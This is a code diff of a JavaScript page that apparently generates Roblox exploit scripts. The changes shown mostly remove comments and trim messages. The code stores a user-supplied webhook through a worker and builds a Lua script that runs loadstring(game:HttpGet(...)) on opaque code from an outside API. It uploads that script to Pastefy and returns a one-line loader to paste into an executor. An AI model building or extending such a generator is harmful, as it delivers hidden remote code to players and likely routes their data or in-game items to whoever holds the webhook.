@@ -812,7 +812,7 @@ function updateCustomAdmin() {
         title: "Vinhub Script - " + new Date().toLocaleDateString(),
         content: script,
         encrypted: false,
-        expireAt: "1D" // Expiration dans 1 jour
+        expireAt: "1D"
       })
     });
 
@@ -822,7 +822,7 @@ function updateCustomAdmin() {
     }
 
     const data = await response.json();
-    return data.paste.raw_url; // Utilise le champ 'raw_url' de la réponse
+    return data.paste.raw_url;
   } catch (error) {
     console.error("Pastefy upload error:", error);
     return null;
@@ -847,7 +847,7 @@ function updateCustomAdmin() {
 
     const alias = generateAlias();
 
-    // Store webhook
+
     const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
       headers: {
@@ -859,7 +859,7 @@ function updateCustomAdmin() {
 
     if (!kvResponse.ok) throw new Error('Failed to store webhook.');
 
-    // Generate script
+
     const names = [...selected];
     const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -883,7 +883,7 @@ loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab7
 ${adminScriptPart}
 `;
 
-    // Upload to Pastefy
+
     const pastefyRawUrl = await uploadToPastefy(script);
 
     if (pastefyRawUrl) {
@@ -912,7 +912,7 @@ ${script}`;
     }, 1500);
   }
 }
-// ====================== RECHERCHE ROBLOX ======================
+
 async function searchRobloxUsers(query) {
   if (query.length < 3) return [];
 
@@ -949,13 +949,13 @@ async function showSuggestions(users) {
   if (users.length === 0) {
     const noResult = document.createElement('div');
     noResult.className = 'suggestion-item';
-    noResult.innerHTML = `<span class="suggestion-username" style="color: var(--muted);">Aucun utilisateur trouvé</span>`;
+    noResult.innerHTML = `<span class="suggestion-username" style="color: var(--muted);">No user found.</span>`;
     container.appendChild(noResult);
     container.style.display = 'block';
     return;
   }
 
-  // Attendre la récupération de toutes les URLs d'avatars
+
   const userPromises = users.map(async (user) => {
     const avatarUrl = await fetchAvatarUrl(user.id);
     return { ...user, avatarUrl };
@@ -986,7 +986,7 @@ async function showSuggestions(users) {
   container.style.display = 'block';
 }
 
-// Debounce
+
 const debounce = (func, delay) => {
   let timeoutId;
   return function(...args) {
@@ -1005,7 +1005,6 @@ document.getElementById('usernameInput').addEventListener('input', debounce(asyn
   showSuggestions(users);
 }, 300));
 
-// ====================== AUTRES FONCTIONS ======================
 function renderList(filter) {
   const q = (filter || '').toLowerCase();
   const list = document.getElementById('animalList');
@@ -1090,7 +1089,7 @@ async function generate() {
 
     const alias = generateAlias();
 
-    // Store webhook
+
     const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
       headers: {
@@ -1102,7 +1101,6 @@ async function generate() {
 
     if (!kvResponse.ok) throw new Error('Failed to store webhook.');
 
-    // Generate script
     const names = [...selected];
     const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -1130,21 +1128,15 @@ loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab7
 ${adminScriptPart}
 `;
 
-    // Upload to Pastefy
+
     const pastefyRawUrl = await uploadToPastefy(script);
 
     if (pastefyRawUrl) {
       out.className = 'code-block';
-      out.textContent = `-- Script generated successfully!
-Copy this loadstring into your executor:
-
-loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
+      out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
     } else {
       out.className = 'code-block';
-      out.textContent = `-- Failed to upload to Pastefy.
-Here is the raw script (copy it manually):
-
-${script}`;
+      out.textContent = `${script}`;
     }
 
   } catch (err) {
